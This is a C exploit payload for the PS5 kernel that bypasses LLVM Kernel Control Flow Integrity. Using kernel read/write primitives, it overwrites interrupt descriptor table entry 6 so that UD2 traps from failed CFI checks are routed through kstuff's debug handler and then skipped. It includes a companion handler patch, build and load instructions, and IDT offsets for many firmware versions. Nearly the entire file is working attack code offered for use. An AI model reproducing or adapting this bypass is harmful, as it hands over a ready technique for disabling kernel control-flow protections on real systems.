/*
 * cfi_bypass.c - KCFI (Kernel Control Flow Integrity) Bypass for PS5 FW 4.03
 *
 * This payload bypasses LLVM KCFI in the PS5 kernel by intercepting
 * exception 6 (Invalid Opcode / UD2) at the IDT level.
 *
 * === How KCFI works on PS5 ===
 *
 * The PS5 kernel uses LLVM's Kernel CFI (KCFI) to protect indirect calls.
 * At each indirect call site, the compiler inserts:
 *
 *     mov eax, <expected_type_hash>
 *     sub eax, dword ptr [target - 4]   ; compare with hash before function
 *     je  .Lok                           ; match -> proceed
 *     ud2                                ; mismatch -> trap (0F 0B, 2 bytes)
 *   .Lok:
 *     call target
 *
 * When the hash check fails, UD2 triggers CPU exception 6 (Invalid Opcode).
 * The kernel's default INT6 handler panics.
 *
 * === Bypass Strategy ===
 *
 * We modify the IDT entry for exception 6 to route it through kstuff's
 * existing INT1 (Debug Exception) handler infrastructure. kstuff uses an
 * IST-based ROP chain in kernel DATA space (avoiding XOM restrictions)
 * that saves all registers, calls the uelf handler in C, and restores.
 *
 * In the uelf handler's fallthrough path (unrecognized RIP addresses),
 * we advance RIP by 2 bytes to skip the UD2 instruction, landing on the
 * 'call target' instruction. This effectively bypasses ALL KCFI checks.
 *
 * INT6 (no error code) can safely share IST7 with INT1 because:
 * - Both are synchronous exceptions (can't be pending simultaneously)
 * - The handler runs with interrupts disabled (interrupt gate)
 * - Debug breakpoints are set at specific addresses, never at UD2 sites
 * - The kelf ROP chain doesn't execute UD2 instructions
 *
 * === Two-Part Implementation ===
 *
 * PART 1 (this payload): Patches IDT[6] to share INT1's handler and IST7.
 *         This routes UD2 exceptions through kstuff's handler chain.
 *
 * PART 2 (kstuff rebuild): Modify uelf/main.c handle() fallthrough to
 *         advance RIP by 2 for unrecognized addresses (see comments below).
 *         Without this, INT6 will loop (handler returns to same UD2).
 *
 * === Required kstuff uelf/main.c modification ===
 *
 * In handle() function, change the fallthrough else block:
 *
 * BEFORE (line ~205):
 *     if(!decrypted)
 *     {
 *         //probably a debug trap that's not yet handled
 *         log_word(regs[RIP]);
 *         log_word(16);
 *     }
 *
 * AFTER:
 *     if(!decrypted)
 *     {
 *         // KCFI bypass: skip UD2 instruction (0F 0B = 2 bytes)
 *         regs[RIP] += 2;
 *     }
 *
 * === Required kstuff main.c modification ===
 *
 * After IDT[1] installation (line ~2798), add:
 *
 *     // INT6 (Invalid Opcode / UD2) - KCFI bypass, shares INT1 handler
 *     kmemcpy((char*)IDT+16*6, (char*)entry+16, 2);
 *     kmemcpy((char*)IDT+16*6+6, (char*)entry+18, 6);
 *     kmemcpy((char*)IDT+16*6+4, "\x07", 1);
 *
 * === Build ===
 *
 *   /opt/ps5-payload-sdk/bin/prospero-clang cfi_bypass.c -o cfi_bypass.elf -lps5api
 *
 * === Usage ===
 *
 * Load this payload AFTER kstuff has been loaded by etaHEN.
 * It patches the IDT on all CPUs to route INT6 through kstuff.
 */

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/sysctl.h>

#include <ps5/payload.h>
#include <ps5/kernel.h>

/* Kernel data base address (set by ps5api) */
extern unsigned long KERNEL_ADDRESS_DATA_BASE;

/* IDT entry size */
#define IDT_ENTRY_SIZE  16

/* Exception vectors */
#define INT_DEBUG       1   /* Debug Exception (#DB) */
#define INT_INVOPCODE   6   /* Invalid Opcode (#UD) - triggered by UD2 */

/* x86_64 IDT Gate Descriptor (16 bytes) */
struct idt_gate {
    uint16_t offset_low;     /* Offset bits 0-15 */
    uint16_t selector;       /* Code segment selector */
    uint8_t  ist;            /* IST index (bits 0-2), reserved (bits 3-7) */
    uint8_t  type_attr;      /* Type(0-3), 0(4), DPL(5-6), P(7) */
    uint16_t offset_mid;     /* Offset bits 16-31 */
    uint32_t offset_high;    /* Offset bits 32-63 */
    uint32_t reserved;       /* Reserved, must be 0 */
} __attribute__((packed));

static uint32_t get_fw_version(void) {
    uint32_t version = 0;
    size_t size = sizeof(version);
    sysctlbyname("kern.sdk_version", &version, &size, NULL, 0);
    return version;
}

static uint64_t get_idt_base(uint32_t fw_version) {
    /*
     * IDT offsets from kstuff prosper0gdb/offsets.c
     * These are offsets from KERNEL_ADDRESS_DATA_BASE.
     * kstuff is required for FW >= 3.00 (Byepervisor handles < 3.00).
     */
    switch ((fw_version & 0xFFFF0000)) {
    /* FW 3.xx */
    case 0x03000000: case 0x03100000:
    case 0x03200000: case 0x03210000:
        return KERNEL_ADDRESS_DATA_BASE + 0x642dc80;

    /* FW 4.xx */
    case 0x04000000: case 0x04020000: case 0x04030000:
    case 0x04500000: case 0x04510000:
        return KERNEL_ADDRESS_DATA_BASE + 0x64cdc80;

    /* FW 5.xx */
    case 0x05000000: case 0x05020000:
    case 0x05100000: case 0x05500000:
        return KERNEL_ADDRESS_DATA_BASE + 0x660dca0;

    /* FW 6.xx */
    case 0x06000000: case 0x06020000: case 0x06500000:
        return KERNEL_ADDRESS_DATA_BASE + 0x655dde0;

    /* FW 7.xx */
    case 0x07000000: case 0x07010000: case 0x07200000:
    case 0x07400000: case 0x07600000: case 0x07610000:
        return KERNEL_ADDRESS_DATA_BASE + 0x2E7FDF0;

    /* FW 8.xx */
    case 0x08000000: case 0x08200000:
    case 0x08400000: case 0x08600000:
        return KERNEL_ADDRESS_DATA_BASE + 0x2eb3df0;

    /* FW 9.xx */
    case 0x09000000: case 0x09050000: case 0x09200000:
    case 0x09400000: case 0x09600000:
        return KERNEL_ADDRESS_DATA_BASE + 0x2d94300;

    /* FW 10.xx */
    case 0x10000000: case 0x10010000: case 0x10200000:
    case 0x10400000: case 0x10600000:
        return KERNEL_ADDRESS_DATA_BASE + 0x2d5c300;

    default:
        printf("[cfi_bypass] WARNING: Unknown FW 0x%08x, trying 4.03 offset\n",
               fw_version);
        return KERNEL_ADDRESS_DATA_BASE + 0x64cdc80;
    }
}

int main(void) {
    uint32_t fw_version = get_fw_version();
    printf("[cfi_bypass] PS5 KCFI Bypass - FW 0x%08x\n", fw_version);
    printf("[cfi_bypass] KERNEL_ADDRESS_DATA_BASE = 0x%lx\n",
           KERNEL_ADDRESS_DATA_BASE);

    uint64_t idt_base = get_idt_base(fw_version);
    printf("[cfi_bypass] IDT base = 0x%lx\n", idt_base);

    /* Read current IDT[1] (INT1 = Debug Exception, installed by kstuff) */
    struct idt_gate int1_gate;
    struct idt_gate int6_gate;

    int ret = kernel_copyout(idt_base + IDT_ENTRY_SIZE * INT_DEBUG,
                             &int1_gate, sizeof(int1_gate));
    if (ret != 0) {
        printf("[cfi_bypass] ERROR: Failed to read IDT[1]: %d\n", ret);
        return 1;
    }

    /* Read current IDT[6] for comparison */
    kernel_copyout(idt_base + IDT_ENTRY_SIZE * INT_INVOPCODE,
                   &int6_gate, sizeof(int6_gate));

    uint64_t int1_handler = (uint64_t)int1_gate.offset_low |
                            ((uint64_t)int1_gate.offset_mid << 16) |
                            ((uint64_t)int1_gate.offset_high << 32);
    uint64_t int6_handler = (uint64_t)int6_gate.offset_low |
                            ((uint64_t)int6_gate.offset_mid << 16) |
                            ((uint64_t)int6_gate.offset_high << 32);

    printf("[cfi_bypass] Current IDT[1] handler = 0x%lx (IST=%d, type=0x%02x)\n",
           int1_handler, int1_gate.ist & 7, int1_gate.type_attr);
    printf("[cfi_bypass] Current IDT[6] handler = 0x%lx (IST=%d, type=0x%02x)\n",
           int6_handler, int6_gate.ist & 7, int6_gate.type_attr);

    /* Verify INT1 is using IST7 (kstuff's noercc handler) */
    if ((int1_gate.ist & 7) != 7) {
        printf("[cfi_bypass] ERROR: IDT[1] IST is %d, expected 7 (kstuff not loaded?)\n",
               int1_gate.ist & 7);
        return 1;
    }

    /* Verify kstuff is loaded by checking the handler address */
    if (int1_handler == 0 || int1_gate.type_attr == 0) {
        printf("[cfi_bypass] ERROR: IDT[1] appears invalid (kstuff not loaded?)\n");
        return 1;
    }

    /* Check if already patched */
    if (int6_handler == int1_handler && (int6_gate.ist & 7) == 7) {
        printf("[cfi_bypass] IDT[6] already patched - KCFI bypass active\n");
        return 0;
    }

    /*
     * Patch IDT[6] to use INT1's handler address and IST7.
     *
     * This makes UD2 (KCFI failure) go through kstuff's noercc handler,
     * which saves all registers, swaps CR3 to the uelf address space,
     * and calls the uelf C handler.
     *
     * The uelf handler must be modified to advance RIP by 2 for
     * unrecognized addresses (the UD2 skip). See file header comments.
     *
     * IDT entry format (16 bytes):
     *   [0:2]  handler offset bits 0-15
     *   [2:4]  segment selector (0x20 = kernel CS)
     *   [4]    IST index (bits 0-2)
     *   [5]    type/attr (0x8E = interrupt gate, DPL=0, present)
     *   [6:8]  handler offset bits 16-31
     *   [8:12] handler offset bits 32-63
     *   [12:16] reserved
     */
    struct idt_gate new_int6 = int1_gate;  /* Copy entire INT1 entry */

    /* Ensure it's an interrupt gate (disables interrupts on entry) */
    /* INT1's type_attr should already be 0x8E, but be explicit */
    new_int6.type_attr = 0x8E;  /* P=1, DPL=0, Interrupt Gate */
    new_int6.ist = 7;           /* IST7 (shared with INT1) */

    printf("[cfi_bypass] Writing IDT[6]: handler=0x%lx IST=7 type=0x8E\n",
           int1_handler);

    ret = kernel_copyin(&new_int6, idt_base + IDT_ENTRY_SIZE * INT_INVOPCODE,
                        sizeof(new_int6));
    if (ret != 0) {
        printf("[cfi_bypass] ERROR: Failed to write IDT[6]: %d\n", ret);
        return 1;
    }

    /* Verify the write */
    struct idt_gate verify;
    kernel_copyout(idt_base + IDT_ENTRY_SIZE * INT_INVOPCODE,
                   &verify, sizeof(verify));

    uint64_t verify_handler = (uint64_t)verify.offset_low |
                              ((uint64_t)verify.offset_mid << 16) |
                              ((uint64_t)verify.offset_high << 32);

    if (verify_handler != int1_handler || (verify.ist & 7) != 7) {
        printf("[cfi_bypass] ERROR: Verification failed! handler=0x%lx IST=%d\n",
               verify_handler, verify.ist & 7);
        return 1;
    }

    printf("[cfi_bypass] SUCCESS: IDT[6] patched - UD2/KCFI routed through kstuff\n");
    printf("[cfi_bypass]\n");
    printf("[cfi_bypass] NOTE: For complete KCFI bypass, kstuff's uelf must also\n");
    printf("[cfi_bypass] be rebuilt with the RIP += 2 modification in handle().\n");
    printf("[cfi_bypass] Without that, UD2 exceptions will loop (not panic).\n");

    return 0;
}
